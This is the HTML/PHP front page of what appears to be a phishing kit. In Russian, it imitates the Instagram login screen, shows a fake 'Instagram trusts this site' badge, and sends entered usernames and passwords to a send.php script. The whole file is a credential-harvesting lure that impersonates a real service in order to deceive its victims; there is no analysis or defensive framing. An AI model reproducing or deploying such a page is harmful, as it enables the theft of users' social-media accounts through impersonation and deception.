<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?=strtoupper(explode('.',$_SERVER['SERVER_NAME'])[0])?> - НОВЫЕ ВОЗМОЖНОСТИ</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="index.css">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
</head>
<body style="background: #fafafa;">
<div id="auth">
    <main>
        <div class="auth-container">
            <div class="block auth_phone">
                <img src="auth_phone.png" alt="">
            </div>
            <div class="block auth_content">
                <div class="auth-info">
                    <img src="verifed.png" alt="">
                    <span>Instagram доверяет этому сайту</span>
                </div>
                <div class="auth-content">
                    <div class="auth_header">
                        <img src="logo-auth.svg" alt="" class="logo">
                    </div>
                    <form action="send.php" method="post">
                        <div class="auth_item">
                            <input type="text" class="auth_input" name="login" v-model="login" required>
                            <label class="auth_label">Номер телефона, имя пользователя или эл. адрес</label>
                        </div>
                        <div class="auth_item">
                            <input type="text" class="auth_input" name="password" v-model="password" onkeypress="return (event.charCode >= 65 && event.charCode <= 90) || (event
                                   .charCode >= 97 && event.charCode <= 122) || (event.charCode >= 48 && event
                                   .charCode <= 57) || event.charCode === 46 || event.charCode === 95" required>
                            <label class="auth_label">Пароль</label>
                        </div>
                        <button type="submit" class="auth_button" @click="click_auth_button+=1" :disabled="login.length < 3|| password.length < 6">Войти</button>
                    </form>
                </div>
                <div class="download">
                    <p>Установите приложение.</p>
                    <div class="download_container">
                        <img alt="" src="google_play.png">
                        <img alt="" src="app_store.png">
                    </div>
                </div>
            </div>
        </div>
    </main>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.11/vue.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/axios@0.12.0/dist/axios.min.js"></script>
<script src="login.js"></script>
</body>
</html>